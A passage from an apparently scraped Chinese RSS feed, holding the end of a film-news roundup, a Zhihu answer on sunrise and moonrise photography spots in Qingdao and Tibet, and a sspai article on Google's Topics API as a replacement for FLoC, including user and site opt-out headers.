2》《亚当计划》《匹诺曹》《母亲》等新片均释出新镜头。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1eY411L7MU\" target=\"_blank\"><strong>漫改动画剧集《小太郎一个人生活》：</strong></a>改编自津村マミ的同名漫画，牧野友映执导，LIDENFILMS 制作，钉宫理惠主役，讲述因某些原因一个人搬到清水公寓的 4 岁少年小太郎的故事，3 月 10 日上线 Netflix。 <a href=\"https://twitter.com/NetflixJP_Anime/status/1491578026173566978\" target=\"_blank\">来源</a></p>\n<h2>📽 影视新闻周报</h2>\n<h3>陈哲艺执导新片《燃冬》官宣主演阵容</h3>\n<p>2 月 8 日，《爸妈不在家》《热带雨》导演陈哲艺自编自导的新片《燃冬》发布首张海报，并正式官宣主演阵容：周冬雨、刘昊然、屈楚萧。该片是新加坡导演陈哲艺的首部内地长片，也是周冬雨、刘昊然的第二次合作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/11/eb79c454ae4c008d9cae35f57da8c32a.jfif\"></figure><h3>Hulu 宣布续订经典动画《飞出个未来》，2023 年上线</h3>\n<p>2 月 9 日，流媒体服务 Hulu 宣布将复活经典动画系列《飞出个未来》（Futurama），目前已预定 20 集，仍由马特·格勒宁、大卫·柯亨领衔创作，除机器人班德外的主要配音演员均确定回归，预计 2023 年上线。《飞出个未来》主要讲述前披萨店外送员菲利浦·弗莱在未来世界的冒险，于 1999 年至 2013 年期间播出，共 7 季 140 集。 <a href=\"https://twitter.com/hulu/status/1491513491907354625\" target=\"_blank\">来源</a></p>\n<h3>Disney+ 新剧《欧比旺》首曝海报</h3>\n<p>Disney+新剧《欧比旺》定档 5 月 25 日上线。该剧由伊万·麦克格雷格、海登·克里斯滕森、摩西·英格拉姆、乔尔·埃哲顿、库梅尔·南贾尼等出演，将是截至目前与「星战」系列主线故事最为贴近的一部剧集。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/11/article/7e483a0ff2d4b5bcdaa353b26e87bc63\"></figure><h3>冰墩墩、雪容融「参演」的动画电影《我们的冬奥》发布新海报</h3>\n<p>动画电影《我们的冬奥》发布「冰雪玫瑰」篇章海报和 <a href=\"https://weibo.com/tv/show/1034:4735247447949349\" target=\"_blank\">预告</a>，2022 北京冬奥会吉祥物冰墩墩和雪容融首登大银幕，和小光头强同框。该片将于 2 月 19 日上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/11/9355a4d65431135de5e8a732c482b90c.png\"></figure><h3>更多</h3>\n<p><strong>索尼超级英雄片《暗夜博士：莫比亚斯》发布新海报：</strong>该片以漫威的「伪吸血鬼」莫比亚斯为主角，他因变异获得超强力量、速度、感知和飞行能力。还有新《蜘蛛侠》反派秃鹫（迈克尔·基顿）回归，马特·史密斯（《神秘博士》）、亚德里亚·霍纳（《环太平洋2》）、泰瑞斯·吉布森（《速度与激情》）、杰瑞德·哈里斯（《切尔诺贝利》）出演，丹尼尔·伊斯皮诺萨（《异星觉醒》）执导，北美4月1日上映。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/11/article/b42377094bd2196629fc3186110ce475\"></figure><p><strong>《杀死伊芙》第四季即最终季首发正式海报：</strong>《杀死伊芙》第四季即最终季首发正式海报，本季共 8 集，定档 2月 28 日回归开播。Eve、Villanelle和 Carolyn 处于非常不同的境地。Eve 踏上了复仇之路，Villanelle 找到了一个全新团体，Carolyn继续不遗余力地追查「十二门徒」和下令杀死 Kenny 的人。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/11/article/44f23f4174dc8c94b246c6fb4d4b7420\"></figure><p><strong>日版《来自星星的你》追加演员阵容，2 月 23 日开播：</strong>2 月 8 日，由福士苍汰、山本美月主演的日版《来自星星的你》宣布追加工藤阿须加、福原遥、木南晴夏、今井翼、光石研、出口夏希等演员，该剧将于 2 月 23 日在 Prime Video 独家播出。</p>\n<h2><strong>🎪 彩蛋</strong></h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/d3638229219d1ce177848c5cef3fc8d2.png\"></figure><p>本期的彩蛋是由中奖读者 <a class=\"ss-atUser\" data-mention=\"@刀客特Leslie\" user-id=\"bs2p3dtb34tch279os9g\" href=\"https://sspai.com/u/yn90jmjq\">@刀客特Leslie</a> 提供的「看图猜电影」，首位猜中片名的读者，可获得彩蛋提供名额 1 次（彩蛋内容包括但不限于「猜电影」「你喜欢的经典影视作品/影人/台词」「电影冷知识」）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/11/8824747f27be092ca0627e86429cbfcf.png\"></figure><p>🎁 本期彩蛋还有一道附加题，由中奖读者 <a class=\"ss-atUser\" data-mention=\"@阿斯巴_甜\" user-id=\"bs2paklb34tcs0pn5j50\" href=\"https://sspai.com/u/aspartame\">@阿斯巴_甜</a> 提供。答对的朋友除了彩蛋提供名额，还可获得少数派 2022 虎年水獭红包封面🧧！本期猜中的「第一名」将会在这篇文章中更新，届时也请各位参与互动的朋友注意站内私信~</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、影片推荐…… 更多精彩尽在 <a href=\"https://sspai.com/page/2021/movie\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71382"},{"title":"2 月 14 日是情人节，世界上有哪些著名的「景点 CP」？","date":"2022-02-11 09:12:38","description":"\n<p data-pid=\"uZZL1jzm\">我倒是感觉青岛的栈桥和大海还不够CP，最CP的的场景，我倒是觉着是：</p>\n<h2>青岛著名的海蚀柱地貌的石老人只有情人节前后才会和石老人在视线上相遇的太阳</h2>\n<p data-pid=\"0nr6R-fR\">尤其是只有特定时段，尤其是2月中旬情人节前后才有的这颗红心！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ee9fb6051412ab5d61bdac1eb52995e9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1300\" data-rawheight=\"867\" data-watermark=\"original\" data-original-src=\"v2-ee9fb6051412ab5d61bdac1eb52995e9\" data-watermark-src=\"v2-648ddb7c1261fdfe7dcf3de502b926af\" data-private-watermark-src=\"v2-e4d11fa478ee01b81ba1b0c7772c871c\"></p>\n<p data-pid=\"D_j2UV-f\">海蚀柱在我国沿海在全国海岸线都有广泛分布。青岛的石老人是一个高达17米的巨大海蚀柱, 其状酷似一个驼背的老人站在海中远眺, 故得名”石老人”。虽然中国有很多著名的海蚀柱，但是，日出从海蚀柱身后升起的角度，而且海蚀柱中间孔洞还能透出太阳的，只有在青岛石老人才可以见到。这里冬季观赏日出的绝佳之地！</p>\n<p data-pid=\"7b3dpSTM\">✅选对季节：因为日出方位角（正北是0˚，正东是90˚，正南是180˚）的原因，夏季日出在夏至，东方比较靠北方的59.8˚，想要拍到日出从石老人身后升起，只有在10月中旬到3月中旬才有机会。而且海水满潮时候最佳，在太阳将要跃出海面的时刻，仿佛被大海粘住一样若即若离，远处一叶扁舟更加浪漫。如果有海鸥飞过，就更美了。</p>\n<p data-pid=\"y5OwoTFb\">⏰在10月中旬到11月，要在秦岭路到靠近云岭路右边位置看，这个时候石老人中心的孔洞是心形❤️的。每天位置都要向石老人方向移动，11月后到12月，在云岭路到索菲亚酒店对面海滩看。最难的是冬至、元旦前后，拍摄日出的位置在一个海角的后面，必须退潮才能过去。冬至之后位置向回，也就是往左边走，2月1日之后，回到云岭路右边，❤️重新出现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-15eb7b96d6ef11b151414fdaa7cac98e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-15eb7b96d6ef11b151414fdaa7cac98e\" data-watermark-src=\"v2-381d936a04682657823b2c3ab341701c\" data-private-watermark-src=\"v2-d18a0a459843191a1c95fd815539a1ba\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-320675b9a45f23b2244cef13bbbc8046_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-320675b9a45f23b2244cef13bbbc8046\" data-watermark-src=\"v2-5b6fb84212132ea4594cfde0f5da1028\" data-private-watermark-src=\"v2-f63349e40b755d19f84763dce626e235\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-bcf3accb33e15a16aa4a2650c9985f7c_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1120\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-bcf3accb33e15a16aa4a2650c9985f7c\" data-watermark-src=\"v2-9bcebc547760fd16b3b36724fd9d884f\" data-private-watermark-src=\"v2-a0be4f4d3f703444522060210d83ffb6\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5b164c03423e0415a7b092346bdb6bd_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"906\" data-rawheight=\"906\" data-watermark=\"original\" data-original-src=\"v2-e5b164c03423e0415a7b092346bdb6bd\" data-watermark-src=\"v2-9ec90de1ba8ac4e8f89bb76f1f9316a2\" data-private-watermark-src=\"v2-12654b258b2a9ae85bd3069b2a5d9119\"></p>\n<p data-pid=\"YDHvgzpf\">如果是其他时间段，石老人的这个孔洞是这样的：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5e77c1b6470567460e1b2962fd2b8e97_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"900\" data-rawheight=\"1200\" data-watermark=\"original\" data-original-src=\"v2-5e77c1b6470567460e1b2962fd2b8e97\" data-watermark-src=\"v2-d8867628e56ea3aea777dcfa3006b82f\" data-private-watermark-src=\"v2-741dd8852361f9b2c74a03d2d4d44ab9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d65311a22629f8f34d44f261c1a076fb_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-d65311a22629f8f34d44f261c1a076fb\" data-watermark-src=\"v2-51384ef48e0d1fa6ac42db3444a8c2f2\" data-private-watermark-src=\"v2-75e44f6093087d4acea11343bf91c90e\"></p>\n<p><br></p>\n<p data-pid=\"P9L0VO16\">类似的还有太阳和各种建筑的CP，也是一年一遇，小别胜新婚：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-17f92c3c8087b6f02b2f809d401ba638_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1120\" data-rawheight=\"1120\" data-watermark=\"original\" data-original-src=\"v2-17f92c3c8087b6f02b2f809d401ba638\" data-watermark-src=\"v2-a0e8c8839975a79a6132010235d8c6a2\" data-private-watermark-src=\"v2-a5c9e5b6aa83c509b93d75d224315aec\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1723b80340cdc3a8679cb6b2af60bdf9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1680\" data-rawheight=\"945\" data-watermark=\"original\" data-original-src=\"v2-1723b80340cdc3a8679cb6b2af60bdf9\" data-watermark-src=\"v2-af212de357e15e122118467e6ffd55a9\" data-private-watermark-src=\"v2-5ccfb1dd99264a8dcc60f6fc2320bba4\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-fec94e68fb69c01161e659cef115a0dd_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-fec94e68fb69c01161e659cef115a0dd\" data-watermark-src=\"v2-c9fb44d8520ff72c2d7605d6fc63b4c1\" data-private-watermark-src=\"v2-bb7aa50eb9f0befc77cf21f8af4ad0f0\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2a9351a4516ef67544047b48e856e91a_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1919\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-2a9351a4516ef67544047b48e856e91a\" data-watermark-src=\"v2-2d0c412b0c7616f9aab44f4d63a050dc\" data-private-watermark-src=\"v2-ea55088fdda6e31e018632879ef459ce\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-538dfb6ac6f26c8bf7fc1c209532ef89_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-538dfb6ac6f26c8bf7fc1c209532ef89\" data-watermark-src=\"v2-8515d1ca873b1cd12c3278b4ccc57094\" data-private-watermark-src=\"v2-d7e69da4cc848b3d71e6dc0d39e0f047\"></p>\n<p><br></p>\n<h2>月亮遇到很难看到的南迦巴瓦月升</h2>\n<p data-pid=\"_3oooK8i\">坐落在西藏林芝地区、海拔7782米的世界第15高峰南迦巴瓦，曾经被中国国家地理评选为“中国最美的山峰”，因常年云雾缭绕，难得一见而显得弥足珍贵。无数旅行者都曾经连续多日在观景台守候，却往往失望而归。（李翀的最高纪录是连续20次过色季拉山而不见）而虔诚的旅行者，都会因为看到南迦巴瓦而感到幸运，甚至欢呼雀跃、顶礼膜拜！</p>\n<p data-pid=\"W6vPKMQd\">一般而言，在色加拉山垭口看到日落的概率是1/10，也就是说，去十次，能看到一次满意的日落。而月亮正好在黄金时段升起，位置合适，一年有一两次。所以说我们在色季拉山垭口看到完美的日照金山，同时又遇到位置合适的月升，真的很难得。三脚架支撑着三台相机拍摄，我则是跪在地上流着激动的眼泪在拍摄。</p>\n<p data-pid=\"c0bVsCPv\">这次南迦巴瓦峰的月升的拍摄点，是距离南迦巴瓦峰39公里，高度差3000米的地方，一次性拍摄的，不是二次曝光，不是Photoshop合成：</p>\n<p data-pid=\"PHd6PIvW\">拍摄设备：EOS 5D Mark IV+EF 100-400mm f/4.5-5.6L IS II USM @380mm</p>\n<p data-pid=\"bKoeBuEB\">手持，1/1000秒，f/8，ISO 800</p>\n<p><img src=\"https://pic3.zhimg.com/v2-39587e58b72bf8f6510c5ccb500104b8_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-39587e58b72bf8f6510c5ccb500104b8\" data-watermark-src=\"v2-970f2ec0fe306c9033c25f25ec6a2004\" data-private-watermark-src=\"v2-a83368426c6379b36c17203a9d3f2d7c\"></p>\n<p><br></p>\n<h2>月亮和建筑物的重合，也算是一种一年只有几次的CP</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-3a1c1cd9cf900f7d53265b202a52285d_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"853\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-3a1c1cd9cf900f7d53265b202a52285d\" data-watermark-src=\"v2-c0462402d53399f1ac6038c7580532f8\" data-private-watermark-src=\"v2-8d7436846ecfea161fe049f520be11af\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-cf86b606474d636445bd03495c6c4339_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"1280\" data-watermark=\"original\" data-original-src=\"v2-cf86b606474d636445bd03495c6c4339\" data-watermark-src=\"v2-53de03f80d2f6c9cadcbdef053766c12\" data-private-watermark-src=\"v2-4dd779f7e0ec2f85fd10fca4f6656f0a\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-5b7063f582e02a0b96b5472038b1ed4e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-5b7063f582e02a0b96b5472038b1ed4e\" data-watermark-src=\"v2-3255cd16ace6cdff7d8835f24b4a3faa\" data-private-watermark-src=\"v2-70ffad18179533ab8939575b0e55d9e1\"></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pinglaohu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">平老虎</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/515916748/answer/2343881832?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/407680656?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">八月底想去青岛玩4-5天，有没有推荐的景点或者美食等攻略呀？</a><br><a href=\"http://www.zhihu.com/question/420098558?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">不去栈桥，青岛有哪些值得一去的小众景点？</a><br>\n","link":"http://www.zhihu.com/question/515916748/answer/2343881832?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"舆论翻车后的救场之作，谷歌的定向广告新招干净又卫生了吗？","date":"2022-02-11 08:08:50","description":"\n<p>2021 年 1 月 25 日，Google 官方博客发表了一篇文章，主题是「<a href=\"https://blog.google/products/ads-commerce/2021-01-privacy-sandbox/\" target=\"_blank\">为网络广告打造隐私优先的未来</a>」。这篇文章介绍了新的广告追踪技术 FLoC，指出 FLoC 可以基本达到与传统的第三方 Cookie 广告追踪同样的广告效果，但有助于保护用户隐私。我们也在去年对这一新技术进行过讨论。</p>\n<p><i>关联阅读：</i><a href=\"https://sspai.com/post/66056\" target=\"_blank\"><i>如果不用第三方 Cookie，Google FLoC 会是更好的替代者吗？</i></a></p>\n<p>一年之后的 2022 年 1 月 25 日，Google 官方博客发表了另一篇文章，主题是「<a href=\"https://www.blog.google/products/chrome/get-know-new-topics-api-privacy-sandbox/\" target=\"_blank\">了解隐私沙盒的全新 Topics API</a>」。这篇文章表示，之前的 FLoC 技术，将会被 Topics 取代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82sn0lb34ta98875k40.png\"></figure><p>回顾过去一年针对 FLoC 的讨论，批评的声音主要集中于以下两点：</p>\n<ul>\n<li>FLoC 对于用户是一个黑盒。因为 FLoC ID 只是一个随机字符串，用户不知道它的意义是什么。但广告商可以通过 FLoC ID 和其他信息，确定用户的画像。</li>\n<li>FLoC 的根据用户的浏览行为特征，将用户放入超过 33000 个行为组中。如果某个组内的用户数足够少，那么结合其他指纹识别技术，可以推断出用户身份，存在隐私风险。</li>\n</ul>\n<p>为此，Google 推出了新的 Topics API，简化了 FLoC，一定程度上解决了大家所关注的问题。</p>\n<h2><strong>基于 Topics API 的个性化广告</strong></h2>\n<p>Topics API 是一种新的浏览器个性化广告解决方案，Topics 可以翻译为「主题」「感兴趣的主题」。我不知道是否应该叫它用户追踪技术，因为广告商可以直接获取用户感兴趣的主题，在不使用隐蔽跟踪技术（如浏览器指纹识别）的前提下，就能继续投放个性化广告。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82sn0lb34ta9bscqipg.png\"></figure><p>Topics API 由 Google 主导设计，是 <a href=\"https://www.privacysandbox.com/\" target=\"_blank\">隐私沙盒</a> 的一部分，被集成在 Chrome 浏览器内部。该技术仍处于开发的早期阶段，将会在今年开展测试。按照目前 Google 公布的信息，如果你的 Chrome 浏览器已经具备了 Topics API 功能，那么广告商投放广告的流程是这样的：</p>\n<ul>\n<li>Chrome 会在本地根据你访问的每个网站的主机名，通过机器学习模型为每个网站分配一个主题。比如一个教你练瑜伽的网站，可能会被分配一个「健身」主题。</li>\n<li>Chrome 会在本地分析你的浏览记录，根据你 3 周内浏览的网站的主题，为你分配 3 个主题，也就是每周 1 个。</li>\n<li>网站内嵌的广告平台的 JavaScript 代码，可以调用 Chrome 浏览器的接口，获得用户感兴趣的 3 个主题。在获取用户感兴趣的主题时，每个主题都会有 5% 的概率返回随机主题。</li>\n<li>广告商根据用户感兴趣的主题，为用户展示个性化广告。</li>\n</ul>\n<h2><strong>Topics API 相比 FLoC 的改进</strong></h2>\n<p>针对公众对于 FLoC 的批评，Topics API 做出的改进可以概括为 2 点：更简单、更透明。</p>\n<ul>\n<li>FLoC 测试版将用户划分为超过 33000 个组，而 Topics API 目前只提供大约 350 个主题（Google 预计最终的主题数量在几百到几千个之间）。因此，对同一个主题感兴趣的人数将足够多，这降低了指纹识别的风险。</li>\n<li>用户可以在 Chrome 浏览器中看到看到自己感兴趣的主题，可以删除自己不喜欢的主题，或者在 Chrome 设置中完全禁用它们。相比于 FLoC ID，Topics API 生成的主题对于用户更加透明，用户更具备控制权。</li>\n<li>Chrome 将公开提供 Topics API 提供的全部主题列表，以确保主题中不包含敏感类别（即种族、性取向、宗教等）。</li>\n</ul>\n<h2><strong>Topics API、FLoC、第三方 Cookie 的对比</strong></h2>\n<p>Google 计划在 Chrome 中，让用户更轻松地识别和管理主题。Google 提供了一张对比图，用来说明第三方 Cookie（左）与 Topics API（右）在用户视角的区别：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c82sn0tb34ta98875k4g.png\"></figure><p>下面的表格，列出了 Topics API、FLoC 和 Cookie 用于个性化广告场景时的异同：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th> </th>\n<th>Topics API</th>\n<th>FLoC</th>\n<th>第三方 Cookies</th>\n</tr></thead>\n<tbody>\n<tr>\n<th>哪个第三方在收集数据</th>\n<td>Google</td>\n<td>Google</td>\n<td>Cookie 所属的广告平台（Google 也是一家广告平台）</td>\n</tr>\n<tr>\n<th>第三方从哪里收集数据</th>\n<td>Google Chrome 浏览器</td>\n<td>Google Chrome 浏览器</td>\n<td>任意浏览器中加入了广告平台追踪代码的网站</td>\n</tr>\n<tr>\n<th>第三方收集了什么数据</th>\n<td>浏览网页过程中产生的全部数据均可被收集</td>\n<td>浏览网页过程中产生的全部数据均可被收集</td>\n<td>浏览网页过程中产生的全部数据均可被收集</td>\n</tr>\n<tr>\n<th>第三方收集的数据存储在哪里</th>\n<td>浏览器本地</td>\n<td>浏览器本地</td>\n<td>广告平台的线上服务器</td>\n</tr>\n<tr>\n<th>第三方收集的数据是匿名的吗</th>\n<td>匿名</td>\n<td>匿名</td>\n<td>匿名</td>\n</tr>\n<tr>\n<th>第三方收集的数据与自然人相关联吗</th>\n<td>否，Topics API 仅知道你感兴趣的 3 个具体主题。</td>\n<td>否，FLoC 仅知道你属于某一个群组。</td>\n<td>是，Cookie 与你直接相关。</td>\n</tr>\n<tr>\n<th>用户可以知道自己的广告画像吗</th>\n<td>是，用户在 Chorme 内可以查看、删除自己感兴趣的话题。</td>\n<td>否，用户只能知道自己的 FLoC ID，无法知道它的含义。</td>\n<td>否，用户只能知道自己拥有哪些第三方 Cookie，无法知道它们的含义。</td>\n</tr>\n</tbody>\n</table></figure><p>根据上面的表格，可以看出 Topics API 基本与 FLoC 一致，在隐私保护方面都比 Cookie 要强。Topics API 的独特之处主要在于，用户可以知道自己的广告画像，并且可以删除它们。</p>\n<p>Google 设计 Topics API 的一个初衷，是为了在保证个性化广告精准投放的情况下保护隐私。但是，具体的操作者是广告平台，用不用、怎么用都由他们决定。如果广告平台真的只使用 Topics API，那么用户的隐私的确可以受到保障。如果广告平台继续通过其他手段获取隐私数据，那么 Topics API 也无能为力。</p>\n<h2><strong>Topics API 的亮点</strong></h2>\n<p>随着 Topics API 的公布，这应该是用户第一次被赋予这种「查看自己画像」权利。</p>\n<p>做过互联网广告投放的朋友们应该知道，在投放广告时，可以选择「细分受众群体类型」，即向对某个主题感兴趣的人群投放广告。以 Google Ads 为例，其官网公布的「兴趣相似的细分受众群」，共有 154 种，比如：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>原文</th>\n<th>翻译</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>/Food &amp; Dining/Fast Food Cravers</td>\n<td>/食品和餐饮/快餐狂热者</td>\n</tr>\n<tr>\n<td>/Media &amp; Entertainment/Movie Lovers</td>\n<td>/媒体与娱乐/电影爱好者</td>\n</tr>\n<tr>\n<td>/Technology/Social Media Enthusiasts</td>\n<td>/技术/社交媒体爱好者</td>\n</tr>\n</tbody>\n</table></figure><p>广告平台和广告商可以根据用户画像，为每个用户精准推送个性化广告。但作为被推送广告的一方，用户却完全不知道自己的画像是什么，就像是站在聚光灯下，别人把自己看得清清楚楚，自己却什么都看不到。</p>\n<p>一般来说，广告平台提供给用户的控制权，只有一个「是否开启个性化广告」的开关。而 Topics API，则可以让用户明确看到自己在广告商那边的感兴趣主题是什么。</p>\n<p>Google 已经公开了一份包含 349 个主题的列表<sup class=\"ss-footnote\" href=\"\" title=\"来源：https://github.com/jkarlin/topics/blob/main/taxonomy_v1.md，有观点认为存在美国中心主义（eg 关于音乐流派等文化内容的分类）、潜在道德问题（eg /Finance/Grants, Scholarships &amp; Financial Aid 学术伦理问题）\" footnote-id=\"1\">1</sup>，Topics API 的主题可能将会从中选择。我将这些主题与 Google Ads 的受众类型进行了比对，发现两者并不完全一致。Topics API 主题的描述更加中性化、去人格化。一个可能的原因是，Topics API 的主题在描述用户的同时，也被用于描述网站。比如：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th>原文</th>\n<th>翻译</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>/Food &amp; Drink/Cooking &amp; Recipes</td>\n<td>/食品和饮料/烹饪和食谱</td>\n</tr>\n<tr>\n<td>/Arts &amp; Entertainment/Movies/Comedy Films</td>\n<td>/艺术与娱乐/电影/喜剧电影</td>\n</tr>\n<tr>\n<td>/Online Communities/Social Networks</td>\n<td>/在线社区/社交网络</td>\n</tr>\n</tbody>\n</table></figure><p>因此，可以说 Topics API 在业界第一次尝试将用户放到了与广告平台同等级的地位上，极大地提高了用户的知情权。</p>\n<h2><strong>退出 Topics API 个性化广告的方法</strong></h2>\n<p>现在，Topics API 仍在开发阶段，尚未推出。因此，这里介绍的方法来自于当前 Google 的相关文档。在正式推出之后，方法可能会发生变化。</p>\n<p>大家可以自行检查，Topics API 是否已经开始工作。在 Chrome 浏览器的 Console 控制台中，运行以下代码，看能否获取到自己的感兴趣主题：</p>\n<p><code>document.browsingTopics()</code></p>\n<p>如果你不想使用 Topics API 个性化广告，可以用以下方法：</p>\n<ul>\n<li>在 Chrome 浏览器的设置内，可以查看自己感兴趣的主题列表、删除主题，或直接退出 Topics API 所隶属的隐私沙盒技术。具体的设置入口将会位于<code>chrome://settings/privacySandbox</code>。</li>\n<li>在隐身模式下，API 调用方（即广告平台）无法获取用户感兴趣的主题，并且在清除浏览历史记录时会清除主题。</li>\n</ul>\n<p>对于网站的拥有者，如果不希望自己的网站被 Topics API 分配一个主题，服务器需要发送指定的响应 Header：</p>\n<p><code>Permissions-Policy: browsing-topics=()</code></p>\n<p>此外，如果网站的拥有者已经使用下面的 Header 退出之前的 FLoC，那么也会自动退出 Topics API 的主题分配：</p>\n<p><code>Permissions-Policy: interest-cohort=()</code></p>\n<h2><strong>总结</strong></h2>\n<p>Topics API 是 Google 在 FLoC 遭受各大浏览器抵制之后推出的又一次广告追踪革新尝试。一方面，Topics API 回应了此前关于 FLoC 技术的一部分隐私质疑，使得指纹追踪变得更加困难；另一方面，Topics API 将画像的控制权一部分交给了客户，使他们可以相对自由地控制自己可以提供的信息，或许可以使此前完全拒绝 Cookies 与 FLoC 的用户产生提供一部分非敏感信息的意愿。</p>\n<p>对普通的用户来说，Topics API 的目的，依然是利于广告商精准投放广告。在总要被投放广告的情况下，Topics API 的隐私性优于 FLoC，更优于 Cookie。因为 Topics API 在浏览器客户端本地完成了用户的行为分析，直接返回用户感兴趣的主题给广告商。广告商可以在不使用追踪技术的情况下，给用户投放个性化广告。对用户来说，Topics API 有极大的透明度，给予了用户一定的控制权。用户可以删除浏览器为自己分配的主题，也可以完全停用此功能。</p>\n<p>出于用户隐私保护的角度，各种浏览器都在逐渐禁止第三方 Cookie。但之前的 FLoC 技术，除 Google 自家的 Chrome 浏览器外，其他各大主流浏览器均以隐私风险为由 <a href=\"https://www.theverge.com/2021/4/16/22387492/google-floc-ad-tech-privacy-browsers-brave-vivaldi-edge-mozilla-chrome-safari\" target=\"_blank\">拒绝集成</a>。这次的 Topics API 是否会遭到相同待遇还有待观察，但可以确定的是，目前关于 Topics API 的讨论中，已经 <a href=\"https://www.theverge.com/2022/1/25/22900567/google-floc-abandon-topics-api-cookies-tracking\" target=\"_blank\">有研究人员</a> 认为这一新技术治标不治本，只是比 FLoC 稍稍好了一些。</p>\n<p>而从广告平台的角度来看，相比于 Cookie，广告平台使用 Topics API 时只能拿到用户自己也能看到的 3 个主题，其他信息均无法获得。它们需要适配 Topics API 所提供的主题，来精准地投放广告。而如果其他浏览器不支持 Topics API，那么广告平台必定会使用其他手段去收集用户信息，以完成跨平台的精准广告投放。广告平台也可以在使用 Topics API 之外，另外用其他手段去收集用户的更多信息，来完成自有的用户画像。此时的它更像是一份「君子协定」。当然，这些都是根据现有信息能做出的推测，至于 Topics API 